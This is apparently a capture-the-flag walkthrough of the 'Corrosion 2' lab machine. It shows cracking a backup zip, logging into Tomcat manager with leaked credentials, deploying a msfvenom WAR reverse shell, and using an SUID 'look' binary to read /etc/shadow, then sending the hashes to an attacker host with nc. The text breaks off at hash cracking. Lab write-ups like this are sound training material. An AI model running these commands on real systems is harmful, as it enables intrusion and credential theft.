# Corrosion 2 Full Walk Through
i designed this Walk-through to document my full process including dead ends and where i got suck

## Recon of the Target Machine
Initially i used sudo arp-scan -l to find the ip address of the target machine, for me it was 10.0.2.16. Next we use nmap to view open ports, services running on them and the version if exposed. I used nmap -T4 -A -p- -sV 10.0.2.16 
![Alt text](/Images/Nmap.png?raw=true "Readme.txt")
This showed </br>
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</br>
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</br>
8080/tcp open  http    Apache Tomcat 9.0.53</br>

## Enumeration of Targets web services
Usually i do some manual enumeration for common files that may be left exposed such as looking for a Robots.txt or a Readme file however i decided to skip straight to enumeration...</br> 
of port 80
![Alt text](/Images/DirsearchPort80.png?raw=true "Readme.txt")

and port 8080
![Alt text](/Images/DirsearchPort8080.png?raw=true "Readme.txt")
Port 80 seems to be useless or may require different scan parameters, however port 8080 has a lot of interesting content that could be used for exploitation. Backup.zip is exposed to the internet, there is an exposed readme file that reads 
![Alt text](/Images/TomcatReadMe.png?raw=true "Readme.txt")
ps: Randy may be a log in credential</br>

## Searching for Exploits
There is a few interesting directories. Before i start looking into the Backup.zip i would like to know what kind of access we have to /manager directory for the tomcat server.</br>
![Alt text](/Images/ManagerLogIn.png?raw=true "Readme.txt")</br>
Exciting!! it seems we have a location to put stolen credential if we can find them. Once you've tried some default passwords and attempt to log in anonymously (sorry but it most likely wont be that easy) we can shift our focus.
For now we will focus on the backup.zip.by typing into the browser http://<TargetIPAddress>:8080/backup.zip or using curl in the terminal curl http://<TargetIPAddress>:8080/backup.zip --output <file_name>
When you try to unzip this file it will show to be password protected. i would recommend completing this process in a designated directory to keep all the files tidy. I attempted to get into this zip file via fcrackzip using a simple brute force attack
![Alt text](/Images/Fcrackzip.png?raw=true "Readme.txt")
A great example as to why a password needs more entropy than just meeting password guidelines. now that we can log in to our zip file. use 7zip or similar to extract the backup file using the password @administrator_hi5 when prompted. You will get an output similar to</br> 
Enter password (will not be echoed):</br>
Everything is Ok</br>

## Exploiting Stolen Credentials
Looking at the extracted files we can see there is a file called tomcat-users in a human readable format (xml).
we cat tomcat-users.xml and find something very interesting!
![Alt text](/Images/TomcatUserXml.png?raw=true "Readme.txt")

here i can see a list of usernames we can add to the list, some of which come with passwords.I would keep these usernames somewhere for potential future brute force efforts. Now lets try to log in as admin or manager to the tomcat server using 'melehifokivai' as the password.
![Alt text](/Images/ManagerLogInSuccess.png?raw=true "Readme.txt")
It Worked!</br>

## Reverse Shell Via .WAR
Since this machine is an easy-medium rating i think a reverse shell explanation may be handy. The idea of many reverse shell methods including this one is to upload a file to a server or target machine with the elevated privileges. In this case we upload a .WAR file with the privileged of the admin tomcat user. .WAR files have an executable component which means we can request a bash shell to be sent to our IP on a specific port(in my case, port 4444) using bash networking, a functionality allowed from modern bash versions (this is often shown in a reverse shell script with dev/tcp). 

The clearest escalation into the system rather than the web facing manager application is through the 'WAR file to deploy' section on the manager page. There are a couple of ways we can spawn a reverse shell using a .WAR file however the most convenient method is to use msfvenom.</br>
- I used the command msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f war -o shell.war creating our .WAR file in the directory our terminal is in.</br>
- We can then go to the 'War file to deploy' field and upload our shell.war file we just created
- using the same port specified in the msfvenom command we will now open a terminal and use net cat to listen to port 4444.
- now go back to the web browser and type in the name of your file like http://<target_IP>/shell and on your netcat terminal we will have a very unstable terminal!

to complete the reverse shell we need to upgrade our terminal. I usually do the following however there are other valid methods.
- python3 -c 'import pty;pty.spawn("/bin/bash")' then press Ctrl+Z
- stty raw -echo;fg then press ENTER twice
- export TERM=xterm
If you would prefer a colour coded terminal for readability like me you can o the following
- export TERM=xterm-256color
- source etc/skel/.bashrc
![Alt text](/Images/UpgradingTerminal.png?raw=true "Readme.txt")

## Escalation Attempt
In home/randy we find 3 interesting files including the user flag!
![Alt text](/Images/RandyNoteFlagPY.png?raw=true "Readme.txt")
The note indicates we Randy had restricted permissions at the moment, this is worth noting but not necessarily an issue. We have also found a python file, this could be a good escalation opportunity. Using ls -al we see it was made by a root user, however with the current user (you may check this with the command whoami) we do not have many permissions or the password to use sudo. Lets have another look at that SSH port for a different log in.

## Lateral Movement
We can see from when we look at the password 'melehifokivai' in the TomcatUser.xml file it has been reused for manager and admin. It seems typing jaye@10.0.2.16 followed by the password melehifokivai. 
After some exploring we can see a function called look that can be executed and when executed it runs as root regardless of permissions of the user since it has both the SUID and SGID bit set.
With some exploring it seems like look uses a specific syntax much like a grep function to find files. now i will look for shadow files typing 
./look "<username>" /etc/shadow. This returns the following</br>
![Alt text](/Images/LookFunction.png?raw=true "Readme.txt")</br>
Pretty interesting, its returning hashes of users for us. Now lets exfiltrate this to our kali system so that we can try and decrypt them. 
on the attacking machine, type 
nc -lnvp 9999 > hashes.txt

on the target machine type...
./look '' /etc/shadow | grep '\$' | nc 10.0.2.15 9999
![Alt text](/Images/MovingHashesToKali].png?raw=true "Readme.txt")</br>
Next we will use john to extract the hashes as so
![Alt text](/Images/HashContentsAndRipper].png?raw=true "Readme.txt")</br>




